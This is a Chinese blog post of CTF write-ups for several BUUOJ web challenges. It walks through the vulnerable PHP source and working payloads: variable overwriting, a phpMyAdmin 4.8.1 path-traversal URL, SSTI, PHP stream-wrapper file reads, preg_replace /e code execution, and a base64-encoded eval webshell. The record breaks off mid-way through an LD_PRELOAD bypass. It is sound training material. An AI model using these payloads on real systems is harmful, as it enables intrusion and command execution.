{"title":"BUUOJ刷题2020119-15","uid":"1f9ed3837271c9618e2c89b56e8e0ee6","slug":"BUUOJ刷题2020119-15","date":"2020-11-09T09:20:59.000Z","updated":"2021-06-28T14:58:01.890Z","comments":true,"path":"api/articles/BUUOJ刷题2020119-15.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"BJDCTF2020-Mark-loves-cat\"><a href=\"#BJDCTF2020-Mark-loves-cat\" class=\"headerlink\" title=\"[BJDCTF2020]Mark loves cat\"></a>[BJDCTF2020]Mark loves cat</h2><p><strong>考点：git泄露、代码审计、变量覆盖</strong></p>\n<p>只发现最下面有一个交互点，这是一个提交留言的交互点的样子，提交试一下，发现会在GET传参message。</p>\n<p>但是有一个奇怪的地方，<code>index.html?message=1111111</code></p>\n<p>但是这个参数并没有被嵌入到网页，所以这个方向应该不行，网页上收集不到什么信息，那么就去后台扫描一下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201109175902295.png\" alt=\"image-20201109175902295\"></p>\n<p>发现了git泄露，之下好办了，githack来一手。</p>\n<p>不知为啥我的githack都不太好使，一会靠谱，一会不靠谱，试了好几次，得到了一个flag.php,这是用来读取flag的，关键应该还是index.php了，试了好几次，终于得到index.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$yds</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"dog\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$is</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"cat\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$handsome</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yds'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$$x</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$$x</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$$y</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">!==</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$handsome</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$yds</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'flag'</span>  <span class=\"token operator\">||</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$is</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"the flag is: \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>下面就是审计一下了。</p>\n<p>这里有两个条件语句都会直接结束程序，所以必须绕过，先看第一个if语句。要绕过这个if需要get类型或post类型设置，第二个if语句呢，那么post类型和get类型的flag都不能为”flag”才行。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;3d723423-9528-4639-9d22-5cf10abd4bb1.node3.buuoj.cn?flag&#x3D;123\n\n\nflag&#x3D;123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201109201409784.png\" alt=\"image-20201109201409784\"></p>\n<p>这样就可以绕过两个if的限制，但是前面的三个foreach还需要处理一下。首先的问题是如何不让flag被覆盖，这里flag如果用flag[]来绕会出问题，flag还是被覆盖为array了，所以方向可能错了。</p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>看看能不能使用别的程序出口。前面有说if如果满足条件就会退出程序。第二个if的出口会返回$is的值，那我们就想办法来覆盖$is变量。首先传入一个get类型的变量flag=flag,来触发程序退出，同时传入一个is=flag来吧flag覆盖is变量。</p>\n<p>上面过程相当于再foreach循环中做了如下操作：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$is</span><span class=\"token operator\">=</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#程序出口时</span>\n<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$is</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201109204926414.png\" alt=\"image-20201109204926414\"></p>\n<p>同理还可以利用其他程序出口来构造。</p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>例如使用第一个if语句的出口，那么这样构造payload：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201109205218574.png\" alt=\"image-20201109205218574\"></p>\n<h3 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h3><p>利用第一个exit()出口</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201110160924434.png\" alt=\"image-20201110160924434\"></p>\n<h2 id=\"GWCTF-2019-我有一个数据库\"><a href=\"#GWCTF-2019-我有一个数据库\" class=\"headerlink\" title=\"[GWCTF 2019]我有一个数据库\"></a>[GWCTF 2019]我有一个数据库</h2><p><strong>考点：POC查找利用</strong></p>\n<p>上来上面都没有，先用dirsearch收集一下信息。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201110164519770.png\" alt=\"image-20201110164519770\"></p>\n<p>访问一下robots.txt，得到的是一个phpinfo.php的存在。</p>\n<p>那就直接去访问一下phpinfo.php吧</p>\n<p>可以看到3306端口有开放一个mysql服务，刚好上面也发现了phpmyadmin的存在，走起。</p>\n<p>不用登录直接连接成功。但是要这么找到flag呢，大概找了一下，没有找到。看了一下phpmyadmin的把呢不能是4.8.1，那么看看是否存在漏洞。用kali的searchsploit命令找一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201110170625871.png\" alt=\"image-20201110170625871\"></p>\n<p>找到了poc:<br><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201110170830623.png\" alt=\"image-20201110170830623\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;47544777-c497-4fa9-ab0a-0305b40218fc.node3.buuoj.cn&#x2F;phpmyadmin&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里要使用多一个../的原因是，这个payload传入的是否会进行一次解码，这样的话<code>target=db_sql.phptarget=db_sql.php%3f/../../../../../../flag</code>，而<code>db_sql.php%3f/</code>被当作一个目录了，所以需要多一个<code>../</code>才行。</p>\n<h2 id=\"BJDCTF2020-The-mystery-of-ip\"><a href=\"#BJDCTF2020-The-mystery-of-ip\" class=\"headerlink\" title=\"[BJDCTF2020]The mystery of ip\"></a>[BJDCTF2020]The mystery of ip</h2><p><strong>考点：模板注入</strong></p>\n<p>这题一开始就发现了使用X-Forwarded-For来伪造IP，然后发现xxf里的内容可以嵌入到HTML里，于是就尝试往网页里构造php脚本来运行。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>脚本成功嵌入，但是似乎并没有执行。这里就很懵逼了，后来也是试了很多次，但是方向都错了，只好去看了一下wp，发现居然是考察ssti，这点当时没有想到，一个可以返回输入值的点，我居然没有往ssti上想确实是秀逗了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201113205003019.png\" alt=\"image-20201113205003019\"></p>\n<p>执行命令，获取flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201113205105694.png\" alt=\"image-20201113205105694\"></p>\n<h2 id=\"BJDCTF2020-ZJCTF，不过如此\"><a href=\"#BJDCTF2020-ZJCTF，不过如此\" class=\"headerlink\" title=\"[BJDCTF2020]ZJCTF，不过如此\"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p><strong>考点：代码审计、php伪协议</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"text\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"I have a dream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>&lt;h1>\"</span><span class=\"token operator\">.</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h1>&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Not now!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//next.php</span>\n    \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看到file_get_content($text,”r”)马上想到使用php伪协议中的data协议来做。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;926d16d4-6a64-4e8b-9dd7-6194602ef134.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到next.php源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$re</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string single-quoted-string\">'/('</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$re</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">')/ei'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'strtolower(\"\\\\1\")'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token variable\">$str</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$re</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$re</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里考察的是preg_replace()函数的/e模式利用，这样的结果就是在匹配成功时就会执行replacement位置的语句（当做php代码执行）</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><strong>反向引用</strong></p>\n<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong>中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote>\n<p>这里看到了一篇红日安全团队的文章附在下面，和本地考点一致</p>\n<p><a href=\"https://mp.weixin.qq.com/s?src=11&amp;timestamp=1605275162&amp;ver=2704&amp;signature=iWriq8iLi519U5ZyboIWK-tJIgGlK68TJ1In6ea4GqtuHP2nwfhWrSPUbantGCwl20-eGci--jLDH4LlnjKQ4jJa2DoJyiARRcsvZZSJvk9Kk46dv73Vff0DkzeLHV10&amp;new=1\">https://mp.weixin.qq.com/s?src=11&amp;timestamp=1605275162&amp;ver=2704&amp;signature=iWriq8iLi519U5ZyboIWK-tJIgGlK68TJ1In6ea4GqtuHP2nwfhWrSPUbantGCwl20-eGci--jLDH4LlnjKQ4jJa2DoJyiARRcsvZZSJvk9Kk46dv73Vff0DkzeLHV10&amp;new=1</a></p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;926d16d4-6a64-4e8b-9dd7-6194602ef134.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;next.php&amp;\\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>利用<code>\\s*=$&#123;getFlag()&#125;</code>来确保匹配到完整的<code>$&#123;getFlag()&#125;</code>，这样在replacement位置执行的代码就是<code>strtolower(&quot;$getFlag()&quot;)</code>,在一个函数中存在${}会认为这是一个变量，并且去执行其中的代码。所以就可以利用这点来调用getFlag()函数，然后传入cmd参数进行命令执行。</p>\n<h2 id=\"GKCTF2020-CheckIN\"><a href=\"#GKCTF2020-CheckIN\" class=\"headerlink\" title=\"[GKCTF2020]CheckIN\"></a>[GKCTF2020]CheckIN</h2><p><strong>考点：代码审计、绕过disable_funciton</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Check_In<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">ClassName</span>\n<span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$decode</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Ginkgo'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">decode</span> <span class=\"token operator\">=</span> @<span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                @<span class=\"token keyword\">Eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">decode</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>很简单的思路，传入一个参数Ginkgo，而这个Ginkgo的参数值会被传给this-&gt;code，然后会把code解base64给this-&gt;decode，再把this-&gt;decode做执行。</p>\n<p>所以先来看看phpinfo信息</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;b99df589-6ade-4a95-bc85-9ad652b6185a.node3.buuoj.cn&#x2F;?Ginkgo&#x3D;cGhwaW5mbygpOw&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>disable_function:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>system()</code>被禁用了，scandir()不知怎么回事也是用不了。构造一个webshell来连接。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;b99df589-6ade-4a95-bc85-9ad652b6185a.node3.buuoj.cn&#x2F;?Ginkgo&#x3D;QGV2YWwoJF9QT1NUWydjbWQnXSk7<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在主根目录下，找到了flag,但是需要运行readflag才可以得到flag。所以需要绕过disable_function限制。</p>\n<p>这里用LD_PRELOAD预加载来绕过</p>\n<p>写一个C脚本：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token 